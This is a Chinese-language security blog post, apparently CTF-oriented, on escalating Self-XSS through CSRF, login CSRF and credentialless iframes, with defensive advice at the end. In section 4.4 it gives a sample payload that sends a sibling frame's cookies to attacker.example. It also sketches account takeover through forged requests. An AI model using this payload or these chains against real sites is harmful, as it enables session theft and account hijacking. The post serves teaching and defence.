---
title: Self-XSS
date: 2026-01-19 09:40:41
tags: ["2026", "XSS"]
categories: ["challenge"]
---

# Self‑XSS：定义、风险评估与进阶利用（含 Credentialless Iframe）

## 0. 摘要

Self‑XSS（自触发 XSS）经常被当成“自嗨洞”，因为默认只炸在攻击者自己的会话里。但只要加上合适的东西（CSRF/会话切换/同站落点/credentialless iframe），它也能变成可复现的攻击链。

抓两条主线：
1. Self‑XSS 能不能打，核心看“执行点”能不能搬到受害者可控/可被影响的上下文里（能否完成链路闭环）。
2. credentialless iframe 的坑点不在“不同源”，而在“存储隔离 + 同源 DOM 仍可能互访”的组合拳。

<!--more-->

## 1. 定义：什么是 Self‑XSS？

**Self‑XSS (Self Cross‑Site Scripting)** 指 XSS 触发点位于“仅当前用户可见/可编辑”的内容中，使得 payload 默认只在攻击者自己的会话里执行。

### 1.1 常见形态
- 个人资料字段（昵称、签名、自我介绍）仅本人可见的预览区
- 私有笔记/草稿/日志内容的渲染
- 仅管理员可见但可由管理员编辑的配置页面

### 1.2 为什么经常被降级
在缺乏额外条件时，Self‑XSS 往往需要强社会工程（例如“诱导用户在控制台粘贴代码”）才能影响他人，因此许多漏洞赏金计划将其归类为 Informational。

## 2. 风险评估框架（何时不再是“自嗨”）

Self‑XSS 的风险提升，本质就是：你有没有额外的“放大器（amplifier）”来把它从“自爆”变成“打到人”。常见放大器包括：
- **能写入受害者可见/可执行的区域**（CSRF/IDOR 把 payload 写进受害者资料 → self 变 stored）
- **能让受害者切到攻击者会话**（Login CSRF / 点击劫持导致会话切换）
- **能在受害者浏览器里拼出两个同源上下文**（credentialless iframe 经典打法）
- **XSS 能直接读/驱动敏感动作**（cookie 非 HttpOnly 直接读；否则走 XSS→CSRF / 读 DOM 数据）

## 3. 传统进阶路径（不依赖 Credentialless）

### 3.1 Self‑XSS + CSRF → Stored XSS
若存在 CSRF 能修改“受害者自身的数据字段”，就可以把 Self‑XSS 变成对受害者可触发的 Stored XSS。防御核心仍是 CSRF Token、SameSite、双重提交等。

### 3.2 Self‑XSS + Login CSRF（会话切换）
若登录接口缺少 CSRF 防护，攻击者可能诱导受害者完成“登录到攻击者账号”的请求，从而在受害者浏览器中触发攻击者账号内的 Self‑XSS。

### 3.3 Social Engineering（Console Pastejacking）
诱导用户在开发者工具粘贴 JS 并执行。现代浏览器/大型站点普遍在控制台给出 Self‑XSS 警告，这类路径更多属于“教育/社工”而非产品漏洞利用。

## 4. 现代进阶：Credentialless Iframe

### 4.1 credentialless 的“关键组合拳”

Chrome 110+ 支持 `credentialless` iframe：
```html
<iframe src="https://example.com/" credentialless></iframe>
```

其核心行为可以记成两句话：
1. **存储分区（partitioned storage）**：credentialless iframe 使用新的、临时的（ephemeral）存储上下文；初始不携带该 origin 的 cookie/LocalStorage 等。
2. **同源策略仍成立**：在多数实现与 [RFC](https://wicg.github.io/anonymous-iframe/#alternatives-opaque-origins) 讨论中，credentialless iframe 并不引入 opaque origin；若与普通 iframe 加载同一 origin，则仍按同源策略允许 DOM 互访。

于是你能拼出一个链路：一个普通 frame（可能带受害者会话）+ 一个 credentialless frame（空会话登录攻击者）并存；同源时就可能读到另一个 frame 的 DOM。

### 4.2 攻击流程（概念图）

![img](https://blog.slonser.info/posts/make-self-xss-great-again/9.png)

### 4.3 关键前置条件（可复现/可落地）

| 条件 | 为什么重要 |
| :--- | :--- |
| 浏览器支持 | 需要支持 `credentialless`（通常为 Chrome 110+） |
| 存在 Self‑XSS | 需要在攻击者会话内可稳定触发脚本执行 |
| 页面可被嵌入 | 目标页面未被 `X-Frame-Options`/`CSP frame-ancestors` 阻断 |
| Cookie 能进入普通 iframe | 这一步经常是“卡点”：由 `SameSite` 与“同站/跨站上下文”决定（见 5.1） |
| 读取能力或行为能力 | 能读什么取决于目标：cookie 非 HttpOnly 可读 cookie；否则更常见是读 DOM/触发受害者态操作（XSS→CSRF） |

### 4.4 代码片段（仅示意）

**payload（示意）：**
```javascript
// 在同源前提下，可访问兄弟 frame 的 DOM/可见信息
// 若 cookie 可读：读取并发送；若 cookie HttpOnly：改为发起受害者态请求或读页面数据
fetch('https://attacker.example/collect?d=' + encodeURIComponent(top.frames[0].document.cookie));
```

---

## 5. 常见阻断点与应对策略（更系统的视角）

### 5.1 Cookie 在 iframe 中何时会发送（SameSite 语义）

需要明确区分三个概念：
- **Same‑Origin（同源）**：scheme + host + port 全相同。
- **Same‑Site（同站）**：通常按 scheme + “站点”（eTLD+1）判断；`localhost` 等特殊 host 在实现中常被视为同站。
- **SameSite（Cookie 属性）**：控制 cookie 在“跨站上下文”中是否发送。

经验规则（以现代浏览器默认 `SameSite=Lax` 为背景），可以当成“复现 checklist”：
- **同站嵌入（same‑site iframe）**：cookie 通常会发送。
- **跨站嵌入（cross‑site iframe）**：`SameSite=Lax/Strict` 通常不发送；只有 `SameSite=None; Secure` 且 HTTPS 才可能发送。

因此，credentialless 这条链路要稳，关键往往不是 payload 写得多骚，而是：承载两层 iframe 的页面要在目标**同站**环境里（否则 Lax 直接把你 cookie 卡死）。

**同站落点（on‑site gadget）**常见来源（CTF 里也经常叫“落点/载体”）：

*   文件上传/预览：上传 HTML/SVG 等并在同站域名下渲染
*   富文本/页面装修：可保存并以 HTML 方式渲染的模块（签名、公告、个人主页等）
*   **JSONP/API 反射**：如果某个 API 返回 `Content-Type: text/html` 且内容可控。
*   **子域名劫持**：在子域上托管 Exploit，利用同站（Same-Site）特性绕过 Lax。

补充：如果目标全站 HTTPS 且 cookie 明确 `SameSite=None; Secure`，那跨站第三方 iframe 也可能带 cookie；但 HTTP 环境下 `SameSite=None` 往往直接被浏览器拒收（别指望它“帮你放水”）。

### 5.2 绕过 Login CSRF 防御 (Token/验证码)

传统 Self‑XSS 链路里，“让受害者先切到攻击者账号”（Login CSRF/会话切换）经常是必经关卡。如果登录接口有 CSRF Token/验证码，这一步就容易卡。

**Credentialless Iframe 的优势**：它是“空会话启动”，能自己拿到该会话的 CSRF token，然后在 iframe 内完成一次合法登录，因此“登录页有 token”并不必然阻断链路。

补充（来自 slonser 的思路）：
* 验证码并不等价于 CSRF 防护：若验证码 token 可被转运到受害者侧（额外通道/人工介入/代理），Login CSRF 仍可能成立。
* `window.name` 可作为“跨页面可携带的字符串容器”，配合 Self‑XSS 触发点执行 `eval(window.name)`（或等价执行方式）可实现“载荷注入点/执行点解耦”。

### 5.3 绕过 HttpOnly (XSS to CSRF)

如果敏感 Cookie (如 `sessionid`) 设置了 `HttpOnly`，Payload `document.cookie` 将读不到任何内容。

**利用方案：XSS→CSRF（别执着偷 cookie）**
HttpOnly 读不到 cookie 就别硬偷了，直接把浏览器当“代打机”，在受害者态把敏感操作打出去。
利用 XSS 能够执行任意 JS 的能力，自动发起 HTTP 请求（使用 `fetch` 或 `xhr`），这些请求会自动携带 HttpOnly Cookie。

*   **修改密码/邮箱**：将受害者账号劫持。
*   **提升权限**：如果是管理员，添加一个新的管理员账号。
*   **获取数据**：读取页面源码（如 API 密钥、用户私信），发送到攻击者服务器。

### 5.4 绕过 Frame Busting (X-Frame-Options)

如果目标设置了 `X-Frame-Options: DENY` 或 `SAMEORIGIN`，Exploit 页面将无法加载 iframe。

补充：更常见的是用 **CSP `frame-ancestors`** 控制可嵌入方；CTF 里经常是“只在部分路由配了 DENY/ancestors”，漏配的那条路由就是突破口。

如果确实无法 iframe，credentialless 这条思路一般就断了，需要回到其他放大器（CSRF、DOM XSS、社工等）。

### 5.5 拓展：fetchLater（当 iframe 被禁时的“延迟代打”思路）

有一种很实战但也很“看环境”的拓展点：**如果目标页被 XFO/CSP 禁止嵌入，导致 credentialless iframe 这条路断了**，你仍然可能利用 Self‑XSS 去做“延迟执行”的受害者态请求。

一种思路是浏览器的新 API **`fetchLater()`**：注册“延迟发送”的请求（时间到/页面关闭/导航离开后再发）。用途更偏“延迟 CSRF/延迟 ATO”。

现实里它不一定可用（版本/实验/灰度），先做 feature detect：

```js
if (typeof fetchLater !== 'undefined') {
    // 可以尝试注册延迟请求
} else {
    // fallback：fetch({keepalive:true}) / navigator.sendBeacon（语义不同，但都是“离开页面也能发”）
}
```

一句话：**iframe 被禁 → credentialless 断；但可以考虑把攻击变成“延迟代打请求”**（前提是浏览器支持且目标接口允许）。

---

## 6. CTF 视角：一眼扫链路的 checklist（短版）

做 Self‑XSS 题的时候，可以按下面顺序快速定位“能不能闭环”：
* **执行点**：Self‑XSS 触发是否稳定？在哪个页面渲染？是否需要用户交互？
* **同站落点**：有没有能承载你 payload 的 same‑site（不一定 same‑origin）页面？（上传/装修/子域/分享页…）
* **Cookie 语义**：`SameSite` 默认 Lax 会卡哪些场景？你是 same‑site 还是 cross‑site？
* **读取目标**：cookie 是否 `HttpOnly`？如果是，优先考虑读 DOM 或 XSS→CSRF/ATO。
* **frame 限制**：`X-Frame-Options` / `frame-ancestors` 是否只在部分路由开启？有没有漏配路径？
* **浏览器特性**：是否存在 `credentialless`？（必要时做 feature detect）
* **Bot 行为**（CTF 常见）：bot 登录什么账号？访问哪个 URL？是否带着真实 cookie？

---

## 7. 防御建议（按优先级）

针对 Self‑XSS 及其进阶链路，防守侧可以按这个优先级“拆链”：

1.  **输入过滤与输出编码（根治）**：
    *   这是防御所有 XSS 的基石。即使是 Self-XSS，也应视为安全漏洞进行修复。
    *   对用户个人资料、昵称等字段进行严格的 HTML 实体编码。

2.  **Cookie 安全属性（让偷 cookie 变难）**：
    *   **`HttpOnly`**: 必须开启。即使发生 XSS，攻击者也无法读取 Session ID，只能进行操作伪造。
    *   **`SameSite`**: 设置为 `Lax` 或 `Strict`，可以防御大多数 CSRF 和跨站嵌入攻击。

3.  **Frame 安全限制（直接断掉 iframe 链路）**：
    *   **CSP**: `Content-Security-Policy: frame-ancestors 'self'`。
    *   **Header**: `X-Frame-Options: SAMEORIGIN` or `DENY`。
    *   这可以阻止页面被恶意 HTML 嵌入，从而切断 Credentialless Exploit 的路径。

4.  **限制同源托管（堵住同站落点）**：
    *   用户上传的文件（特别是 HTML/SVG）应强制下载或托管在完全无关的沙箱域名（如 `assets-target.com`），确保其与主站不同源。

## 参考资料

- [Make Self-XSS Great Again - pswalia2u](https://pswalia2u.github.io/BugBounty/2023/02/04/XSS.html)
- [Make Self-XSS Great Again - slonser](https://blog.slonser.info/posts/make-self-xss-great-again/)
- [Anonymous iframe origin trial - Chrome Developers](https://developer.chrome.com/blog/anonymous-iframe-origin-trial/)
- [Credentialless iframe - MDN](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless)